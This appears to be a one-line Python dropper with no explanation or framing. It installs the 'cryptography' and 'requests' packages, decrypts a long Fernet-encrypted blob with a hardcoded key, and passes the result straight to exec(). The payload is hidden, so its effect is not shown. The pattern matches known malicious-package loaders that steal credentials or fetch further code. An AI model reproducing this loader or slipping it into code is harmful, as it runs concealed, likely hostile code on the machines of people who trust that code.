import subprocess, sys; subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography', 'requests']); from cryptography.fernet import Fernet; import base64, requests; key='hoYKz5KWQ7dTgmTSbQ_aARWf637hcJh_86YfHeEnRN0='; cipher=Fernet(key); exec(cipher.decrypt('gAAAAABn-RYzBrbgwBt1O_xAZqHzwWKiGws8W_mRgqnYAQL9eb8T-OcOlns_3tOMitHwhzz-qudrcI8QYsbOKTTcZyjGMjsXVKZUUiSh-qBzQrs0jR7pPTrBzfSevFzbhL2zZBOWm8eC1Z6UQ9s0dAYh7ey1of8l-Fcu17lQHc0NNGVWxTNuBIT3yNzViqZ-w4MzNcpikBo8bZCMyvGLVqdemMxtRgM9z8_flRwgUNuAnsDe05THx100yNjAqjuCrOvPr3bNLs79N6D5VDfVR7QqmmhjnrVCngU-O9__bvsX29awHpy3F0Uu0JbTIyJbdErGRmukPIB810Zu_Lr0G1Ad6fc6VU1ZHfkQjBbepHYapcjaRc4m0GvvAq84Jp_lYBUFYuvffutL-tw30ogiEbpaCuRp3JIzv-9mkgg35Bj6ko54p3WgL23Qw6j41EQK6TqNl6eBX_IW0eQFFAG6gfatz66xM5T6gsOVqEtYW-mMiSwXOWgIgzn0gvVdnX1vUljG9mnosfl5KB5JtZhHbJ3UHt4YuHu-T6kvKXsViPEZDuPrmLRlXv_C2tjjI0QAB7NlhIm0JXk16SpmZoSfMu0TV-pa9gsPCUmr6Fgw0tvaHurIUWbyUJ_DO6zfZjXOA8fOJ6S5mkQ_IbMjqD6WaEqOrysSrFh6CPAXLAvfu7zL6mAAsSE1VP4GscDZ3_7c_us6144aLlYPJrQBoMgUHGwnf_lBTDL99Ri0n5adZ-5sFDYZNRfdAv2FbznlCbU18Tg5xyVLPV6oBVrUbyXoBIDt3ngFlowvXIeFY64wHyMXjcqnNk2b_gxUK_9JO7xShws_QdXKrieGVKjvU7uL-ILFL_L7EYSnia7gK9h9M4_fASBp9jwl2gCHAdm6tyPofzje4rTVGpOelNSJ_c_PPCBmjTUPWsXzkPc4ZNqdOu7MkNSrKp2KiKQsd1388ogQ2eK69qMHtQQmcvVLNRCa7lnBuK5GHlbaAgeFUMYWBOSyTUjDcfWVXHij397WAVUehyu9roTpoZmFFT8f1kx2AsONp67ZJCzryRnfo1cddVmbrQVVBtaxA1HvekzAMff2umWeiAQddyJJyZk17beokNmMiRLynfrpL8rKUOauq6McJFAnVtFbWRwN_JKS_f9QcRXb6Hp4GshvV-QisoAeeSrr-5XnL0iL2ByZ-sU2O1vR5JvWRHTPd0P9UZoFguGvy8zONeif09crV9FQ3G_vqsoMJNIuWbJGHNsrxyxRs06AiH8muY3hh3g57sdxmS96NykSRv8nYCtjZARuv7vg0dslziuCsxYZSD_1bA2SucJQgKI8N2VQB6x3_Jzop3mxCEiqNAkXg8gD9MFaii02HCTAV1eHBZ-6Ss1MyFyRITmWxIRP9X0dpYPmHCvgcqsC_uCiLmO7CP9LxdVmElClMt2lgCeAjpPrFbWwksSRMEwa7XdLbMGvJrphA3J6gDRgKJS3C2_Zk6WYW_Rrn1DSE7HI4ZMqwpT859sfTiEYlI6u4BV62px6w0jhaRCbgUvuYOaWzZjwqFDSpIDDnYW7TUfhAyooXbARwbX7b7i0Y504zyUvWcnZOMKsJu1Eb5aM5UE4BkIVtl0pf-cr5Mspmj4hMQuAzjUBMvxeif6pA6_n2uDkem20-0HZMwLlsoIgpo73HO5MT1K9dLXilU7Kl6xF_qOuy8ReTL-2QmbIHG-YfhQhEnFSq4viOcZ5S1NkbIeaPd4RqDaUiE0cnOKPO3ONzHmYM74oCRePb4-EwZMAa1LIrjCxgotvUWb23XvpgGbbbvqvdmtr5Sisgft5TM4saOG0nRhmCW2eh1QSIhz34yLLRKNxgH9iv-PkJWL_qp4Brw_IX0U9ddl7xVuZa8yTrboIqT8L0Av0zeHnd2C5HyW8eVyCpS6Evo5TImWHXRXPftZxKXHjJjqS--W8qPxA-35jq1MH3rqYOHfHZwOihqjJ15wAUs5sU5OGh8ZOi_6aOjGylBBy-5hCIUpJY6scP5Hhi8nWp1B4roPIwE3Gic9GB67PyMDws7UzZ1-psJEqDplT0O3JcyNEcqoy2OUXk5nmgzNot9LZvI_qBE1q85Oay38OXplw-uKYf7a-nMmKzkX6O_JLFRIVnD8NFEQAi1kq6IySmFp1pGkLxXkPGhqYs2cXRmBmpymKw__8GZLJksR70yMrAefzC4OZzjp5vBiAwhifu-mYaioMy6iSx7oe1VU1cuFyP46A8EvFANXV5Vk88tFv_IAVk_TQsZYlkABLcOJXS_i7hLBGSwPWbzDw79njCAjJ47UMuSKWc1lrrazHaeWajZssAZeXuztCdQe5s00okAm2iM4SRGRzhw_qG6xAPhqonitHnV28ExN2ROWUkkGkcVNNz1aOnn0szkC8SYTvI4R0mJLOZUTFuwIPPBwalSGH0HV_9BW0qCo3jtL5sEFSNYMneeaF03NW6ZT5j9E48Ic6ep3PSPXeRjL-7WMczNB8L-RyorTdC0ZCoRNROmKuFq5gR19BpnR8b-6hhVYTJiDJrie8vhjVGHTiawcJEHrVAXe9zFnfIIoFwacNLV2bWsFgH06g-kPcJecpQi1EJ_ibGiH9XoA8FDBYGg_4q0iAb3I7BUYtNnSzp7TtDg49gyo499g0Dts_BZcezUgGOs-Yp3mcIe0TQywgtD-_GpYkz5KK2ofdzO5kCywXHSrj9VX9gnzokLZbwRIq_1NA8Sl8TcOrtU3gmXCz60XU0UdTUVoLIY4UUmcoSSprPYwMJJpekdwOwH8yUYIXE5lEur-gxskJOWhdf2FhvZoWsRNbFUl9QuXEjvbLtfwODXnWfuHZKwBrZ6ymtMNI_BwKVDO02gtpGCDU-Qq1NN__ET8EsIjsVrFri4Yl-oFvIFCb4Y8PlV6u5-9dggVCpKAdND2dHeXYEUlFHDp7a0e3d8kxy75lvjnsvyaSdtlNqByqOoKo06rSpEmxzRG_dV8mkN9xGn2uQjvE4jrcmY-GgnfcHjpKOZNr1mc66czAIoo_1wkdDPZHW5NBph3P6tYSPyo5Zn-vSQxlpGYHiTXOj6b3hnfnisLtEIzOdrer0izN3tX1oojxuUuZRbfm8_XtiAwvyVn_BERBM0TWKeOEDFoEaEjFLThRq_Z8SnTp6KWNuyvBHFgCuntJq8_gVn48b0Oq1LlGykmLu4FODJhpEgyDwDGq0rRQEYWo5DvkL4doabJBWVkQ3lV-_fVxmNHdIrkEwJlJ16FwENhg1VYqvR2o4ui-y9HS6UDmIP7sE3kwtqk3vLgFbbnJpRiBkK1E6QUu6_AR8uEu568rWdEDj_X39nsYANw9-OzF8nkFxl8A1lKJb3PpLscSQXyTa1j6b-0zfQaMUjhtLLSlVHaNqsi3u4ycTQ7Ie3N0WcQEPyqQIL_XcBAM03uNW9Mk-j3XKg=='.encode()).decode())